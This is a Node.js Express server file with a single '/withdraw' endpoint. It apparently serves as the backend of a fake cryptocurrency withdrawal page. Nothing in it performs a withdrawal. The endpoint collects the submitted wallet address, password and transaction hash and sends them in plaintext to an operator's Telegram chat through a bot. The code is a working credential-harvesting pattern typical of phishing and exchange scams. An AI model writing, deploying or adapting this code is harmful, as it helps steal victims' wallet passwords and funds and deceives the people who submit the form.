const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

// Allow CORS for safety (your index.html may be served separately)
app.use(cors());
app.use(express.json());

// Load environment variables in Railway
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Check environment variables
if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.log("❌ ERROR: BOT_TOKEN or ADMIN_CHAT_ID missing in Railway Dashboard");
} else {
    console.log("✅ Telegram env loaded");
}

// ---------------------------
// WITHDRAW API
// ---------------------------
app.post("/withdraw", async (req, res) => {
    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;

        // Validate
        if (!coin || !amount || !usdt || !wallet || !password || !hash) {
            return res.status(400).json({ success: false, error: "Missing fields" });
        }

        // Format Telegram message
        const message = `
📤 <b>NEW WITHDRAWAL REQUEST</b>
--------------------------------
💰 <b>Coin:</b> ${coin}
🔢 <b>Amount:</b> ${amount}
💵 <b>USDT:</b> ${usdt}
🏦 <b>Wallet:</b> ${wallet}
🔐 <b>Password:</b> ${password}
🆔 <b>Transaction Hash:</b> ${hash}

⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.
`;

        // Send to Telegram
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
            parse_mode: "HTML"
        });

        console.log("✅ Withdrawal pushed to Telegram");

        return res.json({ success: true });

    } catch (err) {
        console.error("❌ Telegram API Error:", err.response?.data || err.message);
        return res.status(500).json({ success: false, error: "Server Error" });
    }
});

// ---------------------------
// Serve index.html (optional but recommended)
// ---------------------------
app.use(express.static("public")); 
// Make sure your index.html is placed inside /public folder in Railway

// ---------------------------
// Start Railway server
// ---------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
